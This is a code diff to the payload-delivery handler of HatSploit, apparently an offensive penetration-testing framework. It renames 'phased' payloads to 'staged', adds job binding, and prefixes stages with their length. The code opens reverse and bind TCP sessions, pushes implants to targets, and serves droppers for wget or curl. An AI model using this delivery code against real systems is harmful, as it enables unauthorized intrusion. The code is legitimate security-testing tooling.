@@ -35,7 +35,7 @@ from hatsploit.lib.complex import *
 from hatsploit.lib.core.session import Session
 
 from hatsploit.lib.ui.payloads import Payloads
-from hatsploit.lib.ui.jobs import Jobs
+from hatsploit.lib.ui.jobs import Jobs, Job
 
 from hatsploit.lib.handle import Handle
 from hatsploit.lib.core.handler.misc import HatSploitSession
@@ -58,15 +58,17 @@ class Send(Handle, Jobs):
 
     def handle_session(self, host: str, port: int,
                        payload: PayloadOption,
-                       phased: bool = False,
-                       timeout: Optional[int] = None) -> Tuple[Union[Session, socket.socket], str]:
+                       staged: bool = False,
+                       timeout: Optional[int] = None,
+                       job: Optional[Job] = None) -> Tuple[Union[Session, socket.socket], str]:
         """ Handle session.
 
         :param str host: host
         :param int port: port
         :param PayloadOption payload: payload choice
         :param Optional[int] timeout: timeout
-        :param bool phased: send phases or continue
+        :param bool staged: send stages or continue
+        :param Optional[Job] job: job if exists
         :return Tuple[Union[Session, socket.socket], str]: session and host
         :raises RuntimeWarning: with trailing warning message
         :raises RuntimeError: with trailing error message
@@ -76,16 +78,15 @@ class Send(Handle, Jobs):
             raise RuntimeError("No payload configured for handler!")
 
         type = payload.info['Type']
-        session = payload.info.get('Session', HatSploitSession)
 
         if type == ONE_SIDE:
-            if not payload.payload.phased.value and not phased:
+            if not payload.payload.staged.value and not staged:
                 raise RuntimeWarning("Payload sent, but no session was opened.")
 
             if not host or not port:
                 raise RuntimeError("Reverse TCP requires host and port set!")
 
-            client, host = self.listen_session(host, port, session, timeout)
+            client, host = self.listen_session(host, port, timeout=timeout, job=job)
 
             if not client and not host:
                 raise RuntimeError("Reverse TCP received corrupted session!")
@@ -97,12 +98,12 @@ class Send(Handle, Jobs):
             if not host or not port:
                 raise RuntimeError("Reverse TCP requires host and port set!")
 
-            client, host = self.listen_session(host, port, session, timeout)
+            client, host = self.listen_session(host, port, timeout=timeout, job=job)
 
             if not client and not host:
                 raise RuntimeError("Reverse TCP received corrupted session!")
 
-            if payload.payload.phased.value or phased:
+            if payload.payload.staged.value or staged:
                 self.send_all(payload, client)
 
             return client, host
@@ -111,12 +112,12 @@ class Send(Handle, Jobs):
             if not host or not port:
                 raise RuntimeError("Bind TCP requires host and port set!")
 
-            client = self.connect_session(host, port, session, timeout)
+            client = self.connect_session(host, port, timeout=timeout)
 
             if not client:
                 raise RuntimeError("Bind TCP received corrupted session!")
 
-            if payload.payload.phased.value or phased:
+            if payload.payload.staged.value or staged:
                 self.send_all(payload, client)
 
             return client, host
@@ -125,29 +126,38 @@ class Send(Handle, Jobs):
             raise RuntimeError(f"Invalid payload type: {type}!")
 
     def send_all(self, payload: PayloadOption, client: socket.socket) -> None:
-        """ Send implant available in the payload with available phases.
+        """ Send implant available in the payload with available stages.
 
         :param PayloadOption payload: payload option
         :param socket.socket client: primary socket pipe
         :return None: None
         """
 
-        step = 1
+        step = 0
+        send_length = True
 
         while True:
-            if not hasattr(payload.payload, f'phase{step}'):
+            step_method = '' if not step else str(step)
+
+            if not hasattr(payload.payload, f'stage{step_method}'):
                 break
 
-            phase = payload.run(method=f'phase{step}')
+            stage = payload.run(method=f'stage{step_method}')
 
-            if not phase:
-                raise RuntimeError(f"Payload phase #{str(step)} generated incorrectly!")
+            if not stage:
+                raise RuntimeError(f"Payload stage #{str(step)} generated incorrectly!")
 
             self.print_process(
-                f"Sending payload phase #{str(step)} ({str(len(phase))} bytes)...")
-            client.send(phase)
+                f"Sending payload stage #{str(step)} ({str(len(stage))} bytes)...")
+
+            if send_length:
+                time.sleep(.5)
+                client.send(len(stage).to_bytes(4, payload.info['Arch'].endian))
+                send_length = False
 
             time.sleep(.5)
+            client.send(stage)
+
             step += 1
 
         if hasattr(payload.payload, 'implant'):
@@ -157,10 +167,13 @@ class Send(Handle, Jobs):
                 raise RuntimeError("Payload implant generated incorrectly!")
 
             if implant:
-                time.sleep(.5)
-
                 self.print_process(
                     f"Sending payload ({str(len(implant))} bytes)...")
+                if send_length:
+                    time.sleep(.5)
+                    client.send(len(implant).to_bytes(4, payload.info['Arch'].endian))
+
+                time.sleep(.5)
                 client.send(implant)
 
     def serve_dropper(self, dropper: DropperOption, payload: bytes) -> int:
@@ -189,7 +202,9 @@ class Send(Handle, Jobs):
                     'get': get_submethod
                 },
                 1
-            )
+            ),
+            bind_to_module=True,
+            pass_job=True
         )
 
         self.print_process(f"Starting HTTP server (job {str(job_id)})...")
@@ -224,22 +239,22 @@ class Send(Handle, Jobs):
         arch = payload.info['Arch']
 
         buffer = payload.run()
-        phased = len(buffer) > space or payload.payload.phased.value
+        staged = len(buffer) > space or payload.payload.staged.value
 
-        if phased:
-            phase = payload.run(phase=True)
+        if staged:
+            stage = payload.run(stage=True)
 
-            if not phase:
-                raise RuntimeError("No phase available for this payload!")
+            if not stage:
+                raise RuntimeError("No stage available for this payload!")
 
-            phase = self.payloads.pack_payload(
-                payload=phase,
+            stage = self.payloads.pack_payload(
+                payload=stage,
                 platform=platform,
                 arch=arch
             )
 
             if dropper.value in ['wget', 'curl']:
-                self.serve_dropper(dropper, phase)
+                self.serve_dropper(dropper, stage)
 
             job_id = self.create_job(
                 'TCP handler',
@@ -251,17 +266,19 @@ class Send(Handle, Jobs):
                     payload,
                 ),
                 {
-                    'phased': phased
+                    'staged': staged
                 },
-                timeout=1
+                timeout=1,
+                bind_to_module=True,
+                pass_job=True
             )
 
             if dropper.value not in ['wget', 'curl']:
                 self.print_process(
-                    f"Sending payload phase ({str(len(phase))} bytes)...")
+                    f"Sending payload stage ({str(len(stage))} bytes)...")
 
                 config = {
-                    'data': phase,
+                    'data': stage,
                     'args': arguments
                 }
                 config.update(kwargs)
@@ -270,7 +287,7 @@ class Send(Handle, Jobs):
                 post.push()
                 post.exec()
             else:
-                dropper_id = self.serve_dropper(dropper, phase)
+                dropper_id = self.serve_dropper(dropper, stage)
 
                 config = {
                     'uri': (
@@ -305,7 +322,9 @@ class Send(Handle, Jobs):
                 port,
                 payload,
             ),
-            timeout=1
+            timeout=1,
+            bind_to_module=True,
+            pass_job=True
         )
 
         if dropper.value not in ['wget', 'curl']:
@@ -363,17 +382,16 @@ class Send(Handle, Jobs):
         if not host and not port:
             raise RuntimeError("Host and port were not found for payload!")
 
-        type = payload.info['Type']
         space = payload.config.get('Space', 2048)
 
         buffer = payload.run()
-        phased = len(buffer) > space or payload.payload.phased.value
+        staged = len(buffer) > space or payload.payload.staged.value
 
-        if phased:
-            phase = payload.run(phase=True)
+        if staged:
+            stage = payload.run(stage=True)
 
-            if not phase:
-                raise RuntimeError("No phase available for this payload!")
+            if not stage:
+                raise RuntimeError("No stage available for this payload!")
 
             job_id = self.create_job(
                 'TCP handler',
@@ -385,14 +403,16 @@ class Send(Handle, Jobs):
                     payload,
                 ),
                 {
-                    'phased': True
+                    'staged': True
                 },
-                timeout=1
+                timeout=1,
+                bind_to_module=True,
+                pass_job=True
             )
 
             self.print_process(
-                f"Sending payload phase ({str(len(phase))} bytes)...")
-            sender(phase)
+                f"Sending payload stage ({str(len(stage))} bytes)...")
+            sender(stage)
 
             return self.get_job(job_id).join()
 
@@ -405,7 +425,9 @@ class Send(Handle, Jobs):
                 port,
                 payload,
             ),
-            timeout=1
+            timeout=1,
+            bind_to_module=True,
+            pass_job=True
         )
 
         self.print_process(
